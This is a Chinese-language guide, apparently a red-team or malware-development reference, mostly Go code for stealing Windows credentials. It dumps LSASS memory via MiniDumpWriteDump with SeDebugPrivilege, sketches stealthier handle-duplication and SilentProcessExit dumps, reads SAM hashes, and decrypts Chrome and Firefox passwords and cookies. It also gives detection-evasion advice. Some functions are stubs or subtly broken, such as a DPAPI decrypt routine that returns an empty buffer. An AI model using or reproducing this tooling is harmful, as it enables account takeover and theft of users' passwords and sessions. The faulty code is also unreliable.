# 凭据访问(LSASS/SAM/浏览器)

## 1. LSASS转储

### 1.1 MiniDumpWriteDump

**原理：**
- 使用dbgcore.dll的MiniDumpWriteDump函数
- 转储LSASS进程内存
- 需要SE_DEBUG_NAME权限

**Go实现：**
```go
func dumpLSASSMiniDump(outputPath string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    dbgcore := windows.NewLazySystemDLL("dbgcore.dll")
    
    OpenProcess := kernel32.NewProc("OpenProcess")
    MiniDumpWriteDump := dbgcore.NewProc("MiniDumpWriteDump")
    CloseHandle := kernel32.NewProc("CloseHandle")
    
    // 1. 提升权限
    enableSeDebugPrivilege()
    
    // 2. 查找LSASS进程PID
    lsassPid := findProcessByName("lsass.exe")
    
    // 3. 打开LSASS进程
    process, _, _ := OpenProcess.Call(0x1F0FFF, 0, uintptr(lsassPid))
    
    // 4. 创建输出文件
    outputHandle := createFile(outputPath)
    
    // 5. 转储内存
    // MiniDumpWithFullMemory = 2
    MiniDumpWriteDump.Call(process, uintptr(lsassPid), outputHandle, 2, 0, 0, 0)
    
    // 6. 关闭句柄
    CloseHandle.Call(process)
    CloseHandle.Call(outputHandle)
}

// 提升SE_DEBUG_PRIVILEGE权限
func enableSeDebugPrivilege() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    
    OpenProcessToken := kernel32.NewProc("OpenProcessToken")
    LookupPrivilegeValueW := kernel32.NewProc("LookupPrivilegeValueW")
    AdjustTokenPrivileges := kernel32.NewProc("AdjustTokenPrivileges")
    GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
    
    // 获取当前进程Token
    var token uintptr
    currentProcess, _, _ := GetCurrentProcess.Call()
    OpenProcessToken.Call(currentProcess, 0x0020, uintptr(unsafe.Pointer(&token)))
    
    // 查找SE_DEBUG_NAME权限
    debugName, _ := windows.UTF16PtrFromString("SeDebugPrivilege")
    var luid LUID
    LookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(debugName)), 
        uintptr(unsafe.Pointer(&luid)))
    
    // 提升权限
    var tp TOKEN_PRIVILEGES
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = 0x2 // SE_PRIVILEGE_ENABLED
    
    AdjustTokenPrivileges.Call(token, 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
}
```

### 1.2 句柄复制

**原理：**
- 从其他进程复制LSASS句柄
- 不直接打开LSASS进程
- 更隐蔽的方式

**Go实现：**
```go
func dumpLSASSHandleDup(outputPath string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    
    // 1. 查找拥有LSASS句柄的进程
    processes := findProcessesWithLSASSHandle()
    
    // 2. 复制句柄
    for _, pid := range processes {
        sourceProcess := openProcess(pid)
        // DuplicateHandle复制LSASS句柄
        // ...
    }
    
    // 3. 使用复制的句柄转储
}
```

### 1.3 SilentProcessExit

**原理：**
- 利用Silent Process Exit机制
- 触发WerFault.exe转储
- 通过注册表配置

**Go实现：**
```go
func dumpLSASSSilentProcessExit(outputPath string) {
    // 1. 配置注册表
    // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe
    
    // 2. 设置GlobalFlag
    // Silent Process Exit: 0x200
    
    // 3. 设置转储路径
    // ReportingMode: 0x2 (转储并继续)
    // DumpFolder: 输出路径
    
    // 4. 触发Silent Process Exit
    // 通过特定方式触发LSASS进程的Silent Exit
}
```

---

## 2. SAM转储

**原理：**
- 读取注册表HKLM\SAM和HKLM\SYSTEM
- 解密本地账户Hash
- 需要SYSTEM权限

**Go实现：**
```go
func dumpSAM(outputPath string) {
    // 1. 提升到SYSTEM权限
    // (通常需要使用其他技术)
    
    // 2. 读取注册表
    // HKLM\SAM\SAM\Domains\Account\Users
    // HKLM\SYSTEM\CurrentControlSet\Control\Lsa
    
    // 3. 解密Hash
    // 使用SYSKEY解密
}

func readRegistryValue(keyPath string, valueName string) []byte {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    advapi32 := windows.NewLazySystemDLL("advapi32.dll")
    
    RegOpenKeyExW := advapi32.NewProc("RegOpenKeyExW")
    RegQueryValueExW := advapi32.NewProc("RegQueryValueExW")
    RegCloseKey := advapi32.NewProc("RegCloseKey")
    
    // 打开注册表键
    keyPathPtr, _ := windows.UTF16PtrFromString(keyPath)
    var hKey uintptr
    RegOpenKeyExW.Call(0x80000002, uintptr(unsafe.Pointer(keyPathPtr)), 
        0, 0x20019, uintptr(unsafe.Pointer(&hKey)))
    
    // 读取值
    valueNamePtr, _ := windows.UTF16PtrFromString(valueName)
    var size uint32
    RegQueryValueExW.Call(hKey, uintptr(unsafe.Pointer(valueNamePtr)), 
        0, 0, 0, uintptr(unsafe.Pointer(&size)))
    
    data := make([]byte, size)
    RegQueryValueExW.Call(hKey, uintptr(unsafe.Pointer(valueNamePtr)), 
        0, 0, uintptr(unsafe.Pointer(&data[0])), uintptr(unsafe.Pointer(&size)))
    
    // 关闭键
    RegCloseKey.Call(hKey)
    
    return data
}
```

---

## 3. Chrome凭据提取

**原理：**
- 定位Chrome数据目录
- 解密SQLite数据库
- 使用DPAPI解密Cookie和密码

**Go实现：**
```go
func extractChromeCredentials() {
    // 1. 定位Chrome数据目录
    chromePath := getChromeDataPath()
    
    // 2. 读取SQLite数据库
    // Cookies, Login Data
    
    // 3. 使用DPAPI解密
    decryptChromeData(chromePath)
}

func getChromeDataPath() string {
    // Chrome数据目录：
    // C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default
    username := getUserName()
    return fmt.Sprintf("C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default", username)
}

func decryptDPAPI(data []byte) []byte {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    crypt32 := windows.NewLazySystemDLL("crypt32.dll")
    
    CryptUnprotectData := crypt32.NewProc("CryptUnprotectData")
    
    // 解密DPAPI加密的数据
    var desc uintptr
    var decryptedSize uint32
    var decrypted uintptr
    
    CryptUnprotectData.Call(uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)),
        0, 0, 0, 0, uintptr(unsafe.Pointer(&decryptedSize)))
    
    decrypted = VirtualAlloc(0, decryptedSize, 0x1000|0x2000, 0x40)
    CryptUnprotectData.Call(uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)),
        uintptr(unsafe.Pointer(&desc)), 0, 0, 0, 0, uintptr(unsafe.Pointer(&decrypted)))
    
    // 返回解密后的数据
    return make([]byte, decryptedSize)
}
```

---

## 4. Firefox凭据提取

**原理：**
- 定位Firefox profiles目录
- 解密cookies.sqlite和logins.json
- 使用NSS库解密

**Go实现：**
```go
func extractFirefoxCredentials() {
    // 1. 定位Firefox profiles目录
    firefoxPath := getFirefoxProfilesPath()
    
    // 2. 读取profiles.ini确定默认profile
    // C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\profiles.ini
    
    // 3. 解密数据
    // cookies.sqlite: 使用SQLite查询
    // logins.json: 使用NSS解密
}

func getFirefoxProfilesPath() string {
    username := getUserName()
    return fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox", username)
}
```

---

## 5. 进程查找辅助函数

**Go实现：**
```go
func findProcessByName(name string) uint32 {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    psapi := windows.NewLazySystemDLL("psapi.dll")
    
    CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    Process32FirstW := kernel32.NewProc("Process32FirstW")
    Process32NextW := kernel32.NewProc("Process32NextW")
    CloseHandle := kernel32.NewProc("CloseHandle")
    
    // 创建进程快照
    snapshot, _, _ := CreateToolhelp32Snapshot.Call(0x2, 0) // TH32CS_SNAPPROCESS
    
    var pe PROCESSENTRY32W
    pe.Size = uint32(unsafe.Sizeof(pe))
    
    // 遍历进程
    Process32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
    
    for {
        // 获取进程名称
        processName := utf16ToString(pe.ExeFile[:])
        
        if strings.EqualFold(processName, name) {
            CloseHandle.Call(snapshot)
            return pe.ProcessID
        }
        
        // 下一个进程
        ret, _, _ := Process32NextW.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
        if ret == 0 {
            break
        }
    }
    
    CloseHandle.Call(snapshot)
    return 0
}
```

---

## 注意事项

1. **权限问题**：LSASS转储需要SE_DEBUG_PRIVILEGE权限
2. **检测规避**：直接转储LSASS容易被检测
3. **替代方案**：使用句柄复制或SilentProcessExit更隐蔽
4. **SAM转储**：需要SYSTEM权限
5. **浏览器凭据**：需要用户目录访问权限
6. **合法性**：凭据访问操作敏感，仅用于授权安全测试